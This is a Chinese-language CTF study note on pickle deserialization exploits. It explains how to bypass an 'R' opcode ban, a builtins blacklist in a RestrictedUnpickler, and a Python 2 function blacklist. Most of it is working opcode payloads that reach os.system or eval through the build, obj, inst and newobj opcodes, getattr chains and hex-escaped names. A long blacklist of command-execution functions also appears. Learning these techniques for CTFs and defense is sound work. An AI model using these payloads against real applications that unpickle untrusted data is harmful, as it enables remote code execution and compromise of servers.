### 绕过`R` 

要绕过`R` ，基本思路就是找pickle源码中形似`func(args)` 的代码

#### load_build （b）

```python
    def load_build(self):
        stack = self.stack
        state = stack.pop()
        inst = stack[-1]
        setstate = getattr(inst, "__setstate__", None)
        if setstate is not None:
            setstate(state)  # 这里可以看到有形似 func(args) 的代码，并且 setstate 和 state 我们都可控
            return
        slotstate = None
        if isinstance(state, tuple) and len(state) == 2:
            state, slotstate = state
        if state:
            inst_dict = inst.__dict__
            intern = sys.intern
            for k, v in state.items():
                if type(k) is str:
                    inst_dict[intern(k)] = v
                else:
                    inst_dict[k] = v
        if slotstate:
            for k, v in slotstate.items():
                setattr(inst, k, v)
```

`setstate` 我们只需要控制某个类的`__setstate__` 便可以

示例Payload

```python
class Target:
    def __init__(self):
        ser = opcode  # 输入点
        if b"R" in ser:
            print("Hack! <=@_@")
        else:
            obj = pickle.loads(ser)

# R被禁了，所以这种对类的实例化方法失效
opcode=b'''
ccopy_reg
_reconstructor
(c__main__
Target
c__builtin__
object
NtR(dV__setstate__
cos
system
ubVwhoami
b.
'''

# 要想找实例化，就是找__new__或者_instantiate等方法

# 用o对类进行实例化，用16进制代替__setstate__
opcode=b'''(c__main__
Target
o}(S"\\x5f\\x5f\\x73\\x65\\x74\\x73\\x74\\x61\\x74\\x65\\x5f\\x5f"
cos
system
ubS"whoami"
b.'''

# 用i对类进行实例化
opcode=b'''(i__main__
Target
}(S"\\x5f\\x5f\\x73\\x65\\x74\\x73\\x74\\x61\\x74\\x65\\x5f\\x5f"
cos
system
ubS"whoami"
b.'''

# 协议2以上可以用\81 NEWOBJ对类进行实例化
opcode=b'''c__main__
Target)\81}(S"\\x5f\\x5f\\x73\\x65\\x74\\x73\\x74\\x61\\x74\\x65\\x5f\\x5f"
cos
system
ubS"whoami"
b.'''
```

#### load_obj (o)

```python
opcode=b'''(cos
system
V\u0077\u0068\u006F\u0061\u006D\u0069
o.'''
```



#### load_inst (i)

相当于`c` 和`o`的组合

```python
opcode=b'''(V\u0077\u0068\u006F\u0061\u006D\u0069
ios
system
.'''
```

#### load_newobj (\x81)

2022蓝帽杯中学到的技巧

[第六届“蓝帽杯”初赛CTF题目解析](https://mp.weixin.qq.com/s?__biz=MzkyNDA5NjgyMg==&amp;mid=2247493655&amp;idx=1&amp;sn=2eafc10949807487d993882220d05271&amp;chksm=c1d9a84ef6ae2158dac0f1e00fc04efd4e8a0966e16aaaf7a1c00e46ff1fa97b5f574d051721&amp;mpshare=1&amp;scene=23&amp;srcid=07134xssC34Apm45RHto6pPS&amp;sharer_sharetime=1657706356282&amp;sharer_shareid=bc030b6a5149970738c6328966d9421d#rd)

通过这这一串链来调用eval `bytes.__new__(bytes,map.__new__(map,eval,['print(11111)']))`

`\x81` 便会触发 `clazz.__new__()`

```python
    def load_newobj(self):
        args = self.stack.pop()
        cls = self.stack.pop()
        obj = cls.__new__(cls, *args)
        self.append(obj)
```

构造opcode

```python
import pickle, pickletools

opcode = b'''cbuiltins
map
(cbuiltins
eval
(V__import__('os').system('whoami')
tt\x81p0
0cbuiltins
bytes
(g0
t\x81.'''

pickletools.dis(opcode)
pickle.loads(opcode)
```

`bytes`也可以换为`tuple` 、`frozenset`等不可变元素

### 限制builtins

**利用getattr**

[Code-Breaking中的两个Python沙箱 _ 离别歌](F:\LocalCTF\Code-Breaking中的两个Python沙箱 _ 离别歌.html)

```python
import pickle
import io
import builtins
import pickletools

__all__ = ('PickleSerializer', )


class RestrictedUnpickler(pickle.Unpickler):
    blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name not in self.blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


class PickleSerializer():
    def dumps(self, obj):
        return pickle.dumps(obj)

    def loads(self, data):
        try:
            if isinstance(data, str):
                raise TypeError("Can't load pickle from unicode string")
            file = io.BytesIO(data)
            return RestrictedUnpickler(file,
                              encoding='ASCII', errors='strict').load()
        except Exception as e:
            return {}


opcode = b"""cbuiltins
getattr
(cbuiltins
dict
Vget
tR(cbuiltins
globals
)RS'__builtins__'
tRp0
0cbuiltins
getattr
(g0
Veval
tR(V__import__('os').system('whoami')
tR."""

pickletools.dis(opcode)
pickleSer = PickleSerializer()
pickleSer.loads(opcode)
```



### 对执行命令函数的限制

[[2018-XCTF-HITB-WEB]Python's-Revenge](F:\LocalCTF\HITB Python_revenge writeup && python 沙箱逃逸详解 _ m3lon.html)

```python
black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]

def _hook_call(func):
    def wrapper(*args, **kwargs):
        session['cnt'] += 1
        print session['cnt']
        print args[0].stack
        for i in args[0].stack:
            if i in black_type_list:
                raise FilterException(args[0].stack[-2])
            if session['cnt'] > 4:
                raise TimesException()
        return func(*args, **kwargs)
    return wrapper
```

因为环境版本是python2，所以有几种绕过方式

**platform.popen() **绕过

**map** 绕过

```python
class Exploit(object):
    def __reduce__(self):
 	return map,(os.system,["ls"])
```

**input** 绕过

```python
__builtin__.setattr(__builtin__.__import__('sys'),sysin,cStringIO.StringIO('evil_conmand'))
__builtin__.inpput('python>')
```

```python
opcode = b"""c__builtin__
setattr
(c__builtin__
__import__
(S'sys'
tRS'stdin'
cStringIO
StringIO
(S'evil_command'
tRtRc__builtin__
input
(S'python> '
tR."""
```

